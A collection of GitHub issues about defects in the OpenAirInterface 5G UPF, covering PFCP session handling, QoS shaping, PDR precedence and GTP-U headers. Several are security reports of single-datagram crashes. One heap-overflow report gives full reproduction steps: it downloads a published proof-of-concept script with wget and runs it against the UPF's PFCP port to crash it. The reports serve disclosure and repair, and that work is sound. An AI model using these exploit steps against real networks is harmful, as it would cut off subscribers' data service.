items.title: UPF keeps the PFCP sessions of an association when the same CP function sets it up again
items.body:
### Description

When the UPF receives a PFCP Association Setup Request from a CP function that is already associated, it overwrites the association but keeps every PFCP session of the old one.

`upf_n4::handle_receive_association_setup_request()` calls `pfcp_associations::add_association()`. When no peer candidate exists, `add_association()` creates a new `pfcp_association`. `store_association()` then replaces the map entry. The old association object and its session set are dropped, but its sessions stay in `pfcp_switch` with their PDRs, FARs, TEIDs and UE IP entries (`src/upf_app/app/upf_n4.cpp`, `src/upf_app/app/upf_pfcp_association.cpp`, develop 5a0a6d4).

TS 29.244 V17.9.0 clause 6.2.6.2.2 covers a Setup Request with a Node ID that is already associated. The UP function overwrites the existing association, "regardless of the Recovery Timestamp received in the request". It keeps the old sessions only if the request carries PFCP Session Retention Information and asks for them; otherwise it deletes them.

The UPF does not decode PFCP Session Retention Information, so the sessions should be deleted.

This breaks a restarted SMF. After a restart, the OAI SMF sends a new Association Setup Request and allocates CP SEIDs from 1 again. Its first new session then has the same CP F-SEID as a kept session. `pfcp_switch::handle_pfcp_session_establishment_request()` finds that existing session and rejects the request (`CAUSE_VALUE_REQUEST_REJECTED`). The SMF then sends a PDU Session Establishment Reject (5GSM cause #38) to the UE. The same happens to every new session whose CP SEID matches a kept one. The kept sessions are never deleted, because no SMF knows them any more.

### Expected behavior

After an Association Setup Request from an already associated CP function, the UPF has deleted the sessions of the old association. A new session from the restarted SMF is accepted.

### Observed behavior

The old sessions stay. A new session whose CP SEID matches one of them is rejected, and the UE gets a PDU Session Establishment Reject.

### Steps to reproduce

1. Start the core (AMF, SMF, UPF with the simple switch) and attach one or more UEs. We used OAI gNB and nrUE in RF simulator mode, with 4 UEs.
2. Restart the SMF container (`docker restart oai-smf`). The UPF logs `Handle SX ASSOCIATION SETUP REQUEST`.
3. Restart one UE so that it requests a new PDU session.

### Logs

UPF `oaisoftwarealliance/oai-upf:v2.2.2` (the association code is the same on `develop`, 5a0a6d4). AMF and SMF are v2.2.2 with local patches for stale UE contexts and stale PDU sessions; none of them changes PFCP association handling or SEID allocation. Before the SMF restart, the UPF has 4 sessions (UP SEIDs 0x1, 0xb, 0xd, 0xe). After the restart:

```
[14:47:55.772] [upf_n4 ] [info] Handle SX ASSOCIATION SETUP REQUEST
[14:48:26.159] [upf_app] [info] Received N4_SESSION_ESTABLISHMENT_REQUEST seid 0x1
```

The session table that the UPF prints after this request still lists the same 4 old sessions and no new one. SMF:

```
[14:48:26.159] [smf_app] [debug] Received N4 Session Establishment Response sender teid 0x1  pfcp_tx_id 15
[14:48:26.160] [smf_app] [warning] N4 Session Establishment Request for PDU Session ID 10 was rejected by UPF
[14:48:26.160] [smf_n1 ] [debug] PDU Session Establishment Reject,, 5GSM Cause: 0x26
```

The UE got no IP address.

A related point on the SMF side: the OAI SMF also sends an Association Setup Request to an already associated UPF when the NRF notifies it that the UPF registered (`smf_app::handle_nf_status_notification()` → `process_upf_profile()` → `itti_n4_association_retry`). With the deletion that TS 29.244 requires, that would delete the live sessions. That is an SMF issue and is not part of this one.

A fix follows in a pull request.

Assisted-by: Claude:claude-opus-5-5

items.title: QoS and PFCP Session Modification  defects reproduced by PR #5

labels.name: closed-loop-qos
labels.description: This label is to track the Dynamic Closed Loop QoS Feature of OAI Core Network

items.body:
PR #5 adds a PFCP/N4 integration test suite for the UPF. Against a freshly restarted UPF it
reports **22 failing checks across 12 of its 16 scenarios**, reproducing the nine defects
below. `--tag smoke` exits 0, so the harness itself is healthy — these failures are the
suite doing its job.

Descriptions here are deliberately brief. Each scenario file opens with a
`Scenario / Expected behaviour / Expected output` docstring that says what it does, what a
correct UPF would do, and what a passing run prints — that is the fuller description.

To reproduce any of them:

```bash
cd ci-scripts/tests
sudo ./setup_env.sh                              # brings up the UPF and preflights
./run_scenarios.py --scenario <name> -v
```

Restart the UPF before comparing runs (`docker compose -f docker-compose.yaml restart upf`).
Deleted sessions leak their HTB classes and class ids are a hash of (SEID, QFI), so a dirty
UPF can let `qos_rate_change` pass by luck.

---

Related: PR #5 (the test suite).

items.title: An Update QER does not change the enforced rate, and fails silently

labels.name: closed-loop-qos
labels.description: This label is to track the Dynamic Closed Loop QoS Feature of OAI Core Network

items.body:
**Files:** `src/upf_app/user/qer_tc_user.h`, `qer_tc_user.cpp`

## Summary

`Setup()` issues bare `tc class add` for the PDU-session class, the default class, its PFIFO
child and one class per GBR/MBR QER, with no existence guard. Class ids are a deterministic
hash of (SEID, QFI) via `generate_minor_id()` — a pure hash with no counter — so a second
`Setup()` for the same session and QFI always targets the class the first one created.
`tc class add` then fails with *File exists* and the old rate and ceiling stay in place.

**The PFCP response is an accept either way.** Nothing in the signalling distinguishes
"applied" from "silently ignored", which is what makes this dangerous rather than merely
wrong.

## Reproduce

```bash
cd ci-scripts/tests
sudo ./setup_env.sh
docker compose -f docker-compose.yaml restart upf     # see note below
./run_scenarios.py --scenario qos_rate_change --scenario qos_rebuild_tc_failures -v
```

| Scenario | Expected | Observed |
|---|---|---|
| `qos_rate_change` — enforced rate after an update to 20000/40000 | 20000/40000 | **50000/100000** — unchanged |
| `qos_rebuild_tc_failures` — failed `tc` operations while applying it | 0 | **6** |

The pairing is the point. A fix that stopped the `tc` failures without actually applying the
new rate would turn one green and leave the other red.

> **Restart the UPF first.** Deleted sessions leak their classes (see the shaping-state
> issue), and because the class id is a hash of (SEID, QFI), whether a later run collides
> with leftovers depends on where the SEID counter reached. On a dirty UPF `qos_rate_change`
> has been observed to pass by luck.

- `ci-scripts/tests/upf_test/scenarios/06-qos_rate_change.py`
- `ci-scripts/tests/upf_test/scenarios/14-qos_tc_failures.py`

## Suggested fix

Track the classes a `QERTCProgram` created and give `Setup()` a delete-then-add or a
`tc class change` path for a classid that already exists, rather than an unguarded add.
Surfacing a failed `tc` invocation as an error instead of a log line would also stop this
class of defect being silent — a modification that failed to reach the data plane should not
be answered with "Request accepted".

Related: PR #5 (the test suite).

items.title: Repeated Session Modification exhausts XDP attachment

labels.name: closed-loop-qos
labels.description: This label is to track the Dynamic Closed Loop QoS Feature of OAI Core Network

items.body:
**Files:** `src/upf_app/control/SessionProgramManager.cpp`,
`src/upf_app/user/qer_tc_user.cpp`

## Summary

Each `ModifyPipeline` constructs a fresh `QERTCProgram` whose `Setup()` opens, loads and
attaches a BPF program, then overwrites `qer_programs_map_[seid]` without tearing the
previous one down. Programs and their attachments accumulate without bound until the kernel
refuses:

```
libbpf: Kernel error message: Exclusivity flag on, cannot modify
```

Same root cause as the shaping-state teardown issue, filed separately because the symptom
and the point of failure are distinguishable — here the kernel starts refusing work.

**Measured:** 11 modifications of a single session on a freshly restarted UPF produced **22
attach refusals**. A handful of QoS reconfigurations on one PDU session is enough, so this is
reached in ordinary use rather than under stress.

## Reproduce

```bash
cd ci-scripts/tests
sudo ./setup_env.sh
docker compose -f docker-compose.yaml restart upf     # measurements need a clean UPF
./run_scenarios.py --scenario repeated_modification_stability -v
```

| Check | Expected | Observed |
|---|---|---|
| attach refusals across the run | 0 | **22** |
| the 11th modification still rebuilds the datapath | yes | yes — passes |
| rule set unchanged across the run | yes | yes — passes |

> This scenario can leave the UPF degraded, which is why it is numbered last in the suite.
> Restart the container before running anything else after it.

## A correction worth recording

An earlier reading of this held that the refusals also stop `ModifyPipeline` running,
leaving the control plane answering "Request accepted" while the data path silently stopped
updating. **That is not substantiated.** The scenario asserts it explicitly and the assertion
passes: the datapath is still reprogrammed after the refusals. The original observation of
zero rebuilds coincided with a defect in the test harness's own log windowing — stdout and
stderr were concatenated rather than interleaved — so it was almost certainly a measurement
artefact.

What is confirmed is the unbounded accumulation. The assertion that rebuilds continue is kept
in the scenario so that a real regression to silent divergence would be caught rather than
assumed.

- `ci-scripts/tests/upf_test/scenarios/16-repeated_modification.py`

## Suggested fix

Tearing the previous program down before replacing it removes the accumulation. Worth adding
independently: surface an attach failure through `SessionOperationResult` rather than logging
and continuing, so a modification that failed to reach the data plane cannot be answered with
"Request accepted".

Related: PR #5 (the test suite).

items.title: [AI-SEC-VUL-OAI-CN5G-UPF]: a single unauthenticated 16-byte GTP-U (N3) datagram terminates the UPF process
items.body:
**Summary and impact**

One UDP datagram of 16 bytes sent to the UPF's N3/GTP-U port (2152/udp), with no authentication,
terminates the `oai-upf` process (`std::terminate` → `abort()`); reproduced 3/3 and re-confirmed
1/1 in an independent verification round. The N3 interface carries no application-layer
authentication, so any host that can route to 2152/udp — every NF on the core network, or a
compromised gNB/UPF — can kill the user plane at will; all active PDU sessions on that UPF are lost
until the container restarts.

Two distinct fatal paths were observed, selected by the TEID value in the datagram: an uncaught
`fmt::v9::format_error` raised while logging a parse error, and (for one specific TEID) a failed
`CHECK` on folly's `AtomicHashArray` sentinel key. The parse-error log that precedes the first path
prints an IE length of 55060 for a 16-byte datagram, i.e. the parser derives IE lengths from the
packet without bounding them by the received length.

**Affected commit**

`451c27daa4b38bd03a5cb5b92412743364ff8ae0` (tag `v2.2.1` of `OPENAIRINTERFACE/oai-cn5g-upf`, the
commit shipped in the official `oaisoftwarealliance/oai-upf:v2.2.1` image).

**Affected functionality and file paths**

- `src/upf_app/simpleswitch/simple_switch.cpp:92-140` — `upf_n3::handle_receive()`. The fast path
  reads `be16toh(gtpuh->message_length)` and computes payload offsets/lengths from it without ever
  comparing against `bytes_transferred`; the slow path wraps parsing in
  `try { … } catch (gtpu_exception&)` only, so any `std::*` exception escapes the receive thread.
- `src/gtpv1u/3gpp_29.281.cpp:40-45` — the GTP IE factory trusts `tlv.get_length()` from the packet
  (source of the `Unknown GTP IE type … (length 55060)` log for a 16-byte datagram).
- No `catch (...)` guard exists anywhere on the N3 receive path
  (`grep catch src/upf_app src/udp` finds guards only in `SessionProgramManager.cpp`).

**Observed behaviour (log extract)**

```
[upf_n3 ] Unknown GTP IE type 197 (length 55060)     <- from a 16-byte datagram
terminate called after throwing an instance of 'fmt::v9::format_error'
/entrypoint.sh: line …: Aborted (core dumped)
```

Container `RestartCount` increments on every shot; the process dies within milliseconds of the
datagram arriving.

**Reproduction information**

Withheld from this issue per repository policy; full reproduction details (datagram layout,
capture, container logs) will be provided to the security team on request.

**Environment**

Docker deployment of the official `oaisoftwarealliance/oai-upf:v2.2.1` image on Ubuntu 22.04.5 LTS,
kernel 6.8.0-138-generic (`BOOT_IMAGE=/boot/vmlinuz-6.8.0-138-generic root=UUID=… ro quiet splash
vt.handoff=7`), 8 cores, 7702 MB RAM, 396 GB free of 468 GB, x86_64. Local container lab only; no
traffic was sent to any system outside the lab, and the N3 port is not published outside the host.

**Proposed patch**

1. In `upf_n3::handle_receive()`, reject datagrams whose header-declared lengths (message length,
   IE lengths, payload offsets) exceed `bytes_transferred`, before any indexing or logging.
2. Broaden the receive-path guard from `catch (gtpu_exception&)` to `catch (const std::exception&)`
   plus `catch (...)`, so a logging or parsing failure cannot terminate the process.
3. Make log formatting fail-safe (compile-time-checked format strings, e.g. `FMT_STRING`, or a
   `try/catch` inside the logging wrapper): a malformed packet must not be able to kill the NF
   through the log statement that reports it.

**AI tool disclosure**

This vulnerability was identified with an AI-assisted analysis and testing pipeline (Qoder agent)
operating on the released v2.2.1 images and source; per repository policy it is filed publicly
under the `[AI-SEC-VUL]` format instead of the confidential mailing list.

items.title: [AI-SEC-VUL-OAI-CN5G-UPF]: a single unauthenticated 16-byte PFCP (N4) datagram terminates the UPF and the SMF (std::length_error escapes a pfcp_exception-only catch)
items.body:
**Summary and impact**

One UDP datagram of 16 bytes sent to the N4/PFCP port (8805/udp), with no authentication,
terminates the receiving process: `terminate called after throwing an instance of
'std::length_error'` → `abort()`. Confirmed on both `oai-upf` (RestartCount 0 → 159 across the test
campaign) and `oai-smf` (0 → 8); an independent verification round re-confirmed 1/1 on the UPF, with
the throw occurring 6–17 ms after `handle_receive(16 bytes)` and no dispatch log in between. N4
carries no application-layer authentication, so any host that can route to 8805/udp can kill the
user plane and, separately, the session management function; every PDU session on the affected NF is
lost until restart.

The exception is thrown from a length-driven `std::string` allocation inside PFCP message/IE
parsing: a size derived from the datagram is passed to `std::basic_string::append`, and when it
exceeds `max_size()` the allocation throws instead of allocating. The same code path with a
slightly smaller derived size performs the allocation for real — we observed multi-gigabyte RSS
growth and a host-wide OOM from it in a related test — so this is one missing length validation
with two outcomes: process death, or memory exhaustion.

**Affected commit**

- `451c27daa4b38bd03a5cb5b92412743364ff8ae0` (tag `v2.2.1`, `OPENAIRINTERFACE/oai-cn5g-upf`)
- `53af440450d2ece3a3908ba9f87febc4187d232c` (tag `v2.2.1`, `OPENAIRINTERFACE/oai-cn5g-smf`) —
  identical pattern, same defect; a parallel report can be opened on that repository if preferred.

**Affected functionality and file paths**

- `src/upf_app/app/upf_n4.cpp:675-689` — `upf_n4::handle_receive()`: wraps
  `msg.load_from(iss)` in `try { … } catch (pfcp_exception& e)` **only**; `std::length_error` (or
  any other standard exception) escapes the receive thread and terminates the process.
- `src/smf_app/smf_n4.cpp:766` — the SMF's N4 receive path has the same `pfcp_exception`-only catch.
- `src/pfcp/` message/IE parsing — derives sizes from the datagram and feeds them to
  `std::string` operations without validating them against the remaining buffer.

**Observed behaviour (log extract)**

```
[upf_n4 ] handle_receive(16 bytes)
terminate called after throwing an instance of 'std::length_error'
/entrypoint.sh: line …: Aborted (core dumped)
```

**Reproduction information**

Withheld from this issue per repository policy; full reproduction details (datagram layout,
capture, container logs, RestartCount timeline) will be provided to the security team on request.

**Environment**

Docker deployment of the official `oaisoftwarealliance/oai-upf:v2.2.1` and
`oaisoftwarealliance/oai-smf:v2.2.1` images on Ubuntu 22.04.5 LTS, kernel 6.8.0-138-generic, 8
cores, 7702 MB RAM, 396 GB free of 468 GB, x86_64. Local container lab only; no traffic was sent to
any system outside the lab, and 8805/udp is not published outside the host. Containers run under a
memory limit applied by us for test containment; without such a limit the related allocation path
can exhaust host memory (observed separately).

**Proposed patch**

1. Validate every length field taken from a PFCP datagram against the bytes actually remaining
   before using it in an allocation or a container resize; reject the message with a logged error
   otherwise.
2. Broaden the receive-path guards in `upf_n4::handle_receive()` and the SMF equivalent from
   `catch (pfcp_exception&)` to `catch (const std::exception&)` plus `catch (...)`, so one malformed
   datagram cannot terminate the NF.
3. Cap or stream large derived allocations instead of materialising attacker-declared sizes.

**AI tool disclosure**

This vulnerability was identified with an AI-assisted analysis and testing pipeline (Qoder agent)
operating on the released v2.2.1 images and source; per repository policy it is filed publicly
under the `[AI-SEC-VUL]` format instead of the confidential mailing list.

items.title: Downlink PDR selection ranks by SDF specificity instead of the Precedence IE
items.body:
`match_pdr_n6()` ranks matching PDRs by a locally computed "SDF specificity" score and consults the PFCP **Precedence** IE only to break ties — [`xdp_pdr_match_kern.c:415-445`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/kernel/xdp/xdp_pdr_match_kern.c#L415-L445), scoring at [`:144-172`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/kernel/xdp/xdp_pdr_match_kern.c#L144-L172):

```c
} else if (specificity > best_specificity) {
  is_better = true;                                  /* score beats precedence */
} else if ((specificity == best_specificity) && (precedence < best_precedence)) {
  is_better = true;                                  /* precedence only breaks ties */
}
```

TS 29.244 §5.2.1 leaves no room for this: the UP function shall *"find the first PDR matching the incoming packet … starting with the PDRs with the highest precedence and continuing then with PDRs in decreasing order of precedence. Only the highest precedence PDR matching the packet shall be selected"* (§8.2.11: lower value = higher precedence). §5.4.4 makes precedence the SMF's channel for PCC-rule priority — *"The CP function shall map the precedence of a PCC rule to the precedence of the PDRs"* — so re-ranking in the UP function discards operator policy.

**Two inversions this produces**

- A wildcard PDR at precedence 5 (score 100) loses to a `tcp … 8080` PDR at precedence 50 (score ~365).
- A PDR with no SDF entry is stored with `best_specificity` left at 0 ([`:378-396`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/kernel/xdp/xdp_pdr_match_kern.c#L378-L396)), so any SDF-bearing PDR outranks it whatever its precedence — even though §5.2.1 says a match field absent from the PDI "shall be considered as matching all possible values", i.e. a wildcard, not a weak match. A second no-SDF PDR is skipped outright by the `if (!best_pdr)` guard, making the winner depend on PDR array order.

**Observed** — `oai-cn5g-fed` tutorial `docs/DEPLOY_SA5G_WITH_QOS.md` §7.3. The SMF installs DL PDR 3 (precedence 0, `permit out ip from any to assigned`, default flow) and DL PDR 4 (precedence 9, `permit out ip from any to any`, MBR 100 Mbps). Both wildcards score 100, so the tie falls through to precedence and PDR 3 wins: traffic is tagged QFI 1, lands in the default TC class (1 024/2 048 kbps), and the UE measures ~1.9 Mbps instead of the authorised 100. Patching the default flow's `sdf_filters_map` entry so it no longer matches TCP gave 94 Mbps immediately. (The precedence 0 itself is an SMF defect — companion issue below.)

**Suggested fix**

1. Select purely on precedence in `match_pdr_n6()`. If a tie-break is wanted, apply it only when precedences are equal and log the collision — overlapping PDRs at equal precedence are a CP function error.
2. Let no-SDF PDRs take part in that same comparison; the
   [`:378-396`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/kernel/xdp/xdp_pdr_match_kern.c#L378-L396) special case then disappears.
3. Retire `calc_sdf_specificity()` once (1) lands, so the scoring cannot drift back in.

**Three smaller items found alongside** — happy to split these out if you prefer:

- `SdfFilterParser::ParseSdfFilter()` ([`helpers/SdfFilterParser.cpp:182`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/helpers/SdfFilterParser.cpp#L182)) treats `assigned` as `any`, so downlink filters are stored fully wildcarded. Matching still works via the PDI UE IP Address IE, but the filter no longer means what it says; resolving it to the UE IPv4 /32 at install time would fix that.
- The default QoS flow's shaping is hardcoded at 1 024/2 048 kbps  ([`user/qer_tc_user.cpp:71-73`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/user/qer_tc_user.cpp#L71-L73); the setters at [`user/qer_tc_user.h:167-171`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/user/qer_tc_user.h#L167-L171) are never called), so it ignores whatever the SMF authorised — the proximate cause of the 1.9 Mbps above.
- The HTB qdisc and classes on the N3 interface survive container recreation, while class handles derive from the SEID, which restarts at 1. A restarted UPF logs `RTNETLINK answers: File exists` and `0 QoS Flow(s) configured`, then shapes traffic with the previous run's classes. This silently invalidated two of our test runs before we noticed. [`NoHtbRootQdisc()`](https://github.com/openairinterface/oai-cn5g-upf/blob/2872d4903f35bf522f14680f45bb7fbef66cbf2f/src/upf_app/user/qer_tc_user.cpp#L102) only tests for presence.

Companion `oai-cn5g-smf` issue : https://github.com/openairinterface/oai-cn5g-smf/issues/4  — which is what makes this selection defect user-visible.

items.title: Pre-Association Heap Overflow in the PFCP User ID IE Parser: a Wire-Supplied `uint8_t` Length Drives `istream::read()` Into an 8-Byte Array
items.body:
### Summary

Commit ID: 7a028b7b

The object is the OAI UPF's PFCP decoder on the N4 interface: `pfcp_user_id_ie::load_from()`, the parser for the User ID IE (TS 29.244 §8.2.114, IE type 141). The defect is a heap buffer overflow — the parser takes a single `uint8_t` length octet straight off the wire and uses it as the size of an `istream::read()` into the fixed 8-byte arrays `imsi_t::b[8]` / `msisdn_t::b[8]`.

The overflow occurs because nothing between the wire and the array ever checks that length: it is not validated against the destination size, the enclosing TLV length, or the bytes remaining in the datagram — and the sink runs during IE deserialisation, strictly before message-type dispatch, SEID validation, PFCP association checks and the message-length consistency throw, which is why a bare Heartbeat Request carrying the malformed IE corrupts the heap even though the IE is then rejected as semantically illegal (`Illegal IE 141`). With `length_of_imsi = 255`, `istream::read()` writes **247 bytes past the end** of the heap-allocated object, smashing the two `std::string` members (`imei`, `nai`) that follow `imsi` in the class layout; their internal pointers become attacker-chosen bytes, and the subsequent `~basic_string()` calls `operator delete()` on that value, aborting in glibc with `double free or corruption (out)`.


### Step to Reproduce
1. **Deploy the core and confirm the baseline** — tear down any running instance first (any other running core must be stopped):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/oai/issues/upf/36
   docker compose -p oai -f docker-compose-basic-nrf.yaml down -v
   docker compose -p oai -f docker-compose-basic-nrf.yaml up -d
   until [ "$(docker inspect -f '{{if .State.Health}}{{.State.Health.Status}}{{else}}x{{end}}' oai-upf)" = "healthy" ]; do sleep 5; done
   UPF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oai-upf)
   ```

2. **Run the differential** — two datagrams differing in exactly one octet:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260925-POC/upf_pfcp_userid_heap_overflow_poc.py
   python3 upf_pfcp_userid_heap_overflow_poc.py --target "$UPF_IP" --port 8805 --mode all
   # control: 22-byte Heartbeat Request, User ID IE, length_of_imsi = 8 -> parsed and
   #          rejected as Illegal IE 141; pre- and post-control liveness probes answered
   # attack : 269-byte Heartbeat Request, length_of_imsi = 255 -> 247 bytes past
   #          imsi.b[8]; VERDICT: UPF killed = True (ExitCode=139)
   ```

3. **Verify the kill** — container state, kernel fault inside libc, and the glibc abort as the last UPF log line:

   ```bash
   docker inspect -f 'Status={{.State.Status}} ExitCode={{.State.ExitCode}} OOMKilled={{.State.OOMKilled}} RestartCount={{.RestartCount}}' oai-upf
   # -> Status=exited ExitCode=139 OOMKilled=false RestartCount=0
   dmesg -T | grep oai_upf | tail -1
   # -> traps: oai_upf[464914] general protection fault ip:7f35899bb898 sp:7f358710fde0 error:0 in libc.so.6[7f35899bb000+195000]
   docker logs oai-upf 2>&1 | tail -3
   # -> handle_receive(269 bytes) / Illegal IE 141 ... / double free or corruption (out)
   ```

### Logs

**UPF log** (`docker logs oai-upf`) — the control and the attack both reach the parser and produce the identical `Illegal IE 141` rejection; only the overflowing length kills:

```
# control, 22-byte datagram (length_of_imsi = 8) -- UPF survives, heartbeats continue:
[2026-10-07 06:17:34.393] [upf_n4 ] [info] handle_receive(22 bytes)
[2026-10-07 06:17:34.393] [upf_n4 ] [info] handle_receive exception PFCP msg 0 Illegal IE 141 Exception /openair-upf/src/common-src/pfcp/msg_pfcp.hpp:1332
[2026-10-07 06:17:36.760] [upf_n4 ] [info] handle_receive(16 bytes)
[2026-10-07 06:17:36.760] [upf_n4 ] [info] Received SX HEARTBEAT REQUEST
...
# attack, 269-byte datagram (length_of_imsi = 255) -- last three lines of the log:
[2026-10-07 06:17:40.401] [upf_n4 ] [info] handle_receive(269 bytes)
[2026-10-07 06:17:40.401] [upf_n4 ] [info] handle_receive exception PFCP msg 0 Illegal IE 141 Exception /openair-upf/src/common-src/pfcp/msg_pfcp.hpp:1332
double free or corruption (out)
```

**Host kernel ring buffer** — the fault is inside `libc.so.6` (`ip − libc_base = 0x898`, the `operator delete` path on the smashed pointer), not inside `oai_upf`:

```
[Wed Oct  7 12:17:39 2026] traps: oai_upf[464914] general protection fault ip:7f35899bb898 sp:7f358710fde0 error:0 in libc.so.6[7f35899bb000+195000]
```
### Affected Versions

- `oaisoftwarealliance/oai-upf:v2.2.1`:  **tested**
- `oaisoftwarealliance/oai-upf:develop` :  **tested**

### Impact

One unauthenticated 269-byte UDP datagram kills the UPF — the sole gateway for all user data — instantly dropping every PDU session, GTP-U tunnel and in-flight packet, with no restart policy to recover it. Because the attacker controls the overflow length and every written byte, this is a heap-corruption primitive with a realistic code-execution path in the subscriber-traffic gateway, not merely a crash.

### CVSS v4

`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` — **9.3 (Critical)**

items.title: UPF Simple Switch: GTP-U Error Indication TX omits S=1 (TS 29.281 clause 5.1)
items.body:
OAI UPF (Simple Switch datapath) sends GTP-U Error Indication (message type 26)
with S=0 and an 8-octet header, however TS 29.281 clause 5.1 requires S=1 for Error
Indication (optional header present, Sequence Number may be ignored by the peer).
Header TEID is correctly set to 0 and mandatory IEs are correct.

A peer that validates the header may reject the message as malformed and never
run TS 23.527 §5.3.3.1 recovery.

# Details

From TS 29.281 clause 5.1 (also reflected in UPF header comments in
`gtpv1u/3gpp_29.281.hpp`):

- For Error Indication, the **S flag shall be set to '1'**.
- For Error Indication, **header TEID shall be all zeros** (failed TEID is only in
  **TEID Data I**, Table 7.3.1-1 / clause 8.3).

# Tests

Setup: OAI RAN + OAI CN5G, Simple Switch UPF (`enable_bpf_datapath: no`).
Trigger: restart `oai-upf`, then UE UL with stale N3 outgoing TEID.

See:

[EI-OAICN5G.zip](https://github.com/user-attachments/files/32094267/EI-OAICN5G.zip)

```
30 1a 00 0c 00 00 00 00          flags 0x30 (S=0), type 26, len 12, TEID 0
10 00 00 00 1e                   TEID-I = 0x1e
85 00 04 c0 a8 46 81             Peer Address = 192.168.70.129
```

# Possible cause

`upf_n3::report_error_indication()` (simpleswitch/simple_switch.cpp) sets header TEID 0 and mandatory IEs, but never sets a sequence number.

`gtpu_l4_stack::send_indication()` (gtpv1u/gtpv1u.cpp) only calls msg.set_sequence_number(sn) if get_sequence_number() is true. With no SN, encode keeps S=0.
